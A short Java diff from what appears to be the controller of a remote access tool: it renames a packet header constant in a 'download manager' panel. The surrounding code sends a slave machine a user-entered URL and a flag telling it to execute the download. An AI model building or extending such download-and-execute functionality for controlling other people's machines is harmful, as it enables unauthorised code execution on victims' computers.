@@ -18,8 +18,8 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
 import com.redpois0n.ui.renderers.JComboBoxIconRenderer;
 import com.redpois0n.utils.IconUtils;
 
@@ -73,7 +73,7 @@ public class PanelControlDownloadManager extends PanelControlParent {
 				}
 				model.addRow(new Object[] { IconUtils.getIcon("update", true), txtURL.getText().trim(), chckbxExecute.isSelected() + "", comboBox.getSelectedItem().toString(), "Sent..." });
 				
-				PacketBuilder packet = new PacketBuilder(Header.CUSTOM_DOWNLOAD);
+				PacketBuilder packet = new PacketBuilder(OutgoingHeader.CUSTOM_DOWNLOAD);
 				
 				packet.add(txtURL.getText().trim());
 				packet.add(chckbxExecute.isSelected() + "");
